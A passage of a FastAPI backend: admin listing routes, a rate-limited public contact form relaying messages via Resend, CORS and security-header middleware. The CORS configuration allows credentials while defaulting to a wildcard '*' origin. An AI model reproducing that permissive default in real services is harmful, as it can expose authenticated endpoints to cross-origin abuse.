    """Admin: list all documents for a specific user."""
    docs = await db.documents.find(
        {"user_id": user_id}, {"_id": 0}
    ).sort("created_at", -1).to_list(50)
    return docs


# ============================================================
#   Contact form (public, rate-limited, sends via Resend)
# ============================================================

class ContactIn(BaseModel):
    name: str = Field(min_length=1, max_length=120)
    email: EmailStr
    message: str = Field(min_length=10, max_length=5000)


@api.post("/contact")
async def contact_form(body: ContactIn, request: Request):
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"contact:{ip}", max_requests=3, window_seconds=600)

    doc = {
        "id": _new_id(),
        "name": body.name.strip(),
        "email": body.email.lower().strip(),
        "message": body.message.strip(),
        "ip": ip,
        "created_at": _now_iso(),
    }
    await db.contact_messages.insert_one(doc)

    # Best-effort relay to support inbox
    if RESEND_API_KEY:
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, lambda: resend.Emails.send({
                "from": RESEND_FROM_NOREPLY,
                "to": [RESEND_REPLY_TO],
                "reply_to": body.email,
                "subject": f"[Contact] {body.name}",
                "text": f"From: {body.name} <{body.email}>\nIP: {ip}\n\n{body.message}",
            }))
        except Exception:
            logger.warning("Contact form email relay failed")
    return {"ok": True}


@api.get("/admin/contact-messages")
async def admin_list_contact_messages(_=Depends(require_admin)):
    docs = await db.contact_messages.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return docs


# ============================================================
#   Mount + middleware
# ============================================================

app.include_router(api)
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)


# Security headers (helps with abuse-detection crawlers, prevents clickjacking, etc.)
@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=(), payment=()"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response


@app.on_event("shutdown")
async def shutdown():
    client.close()
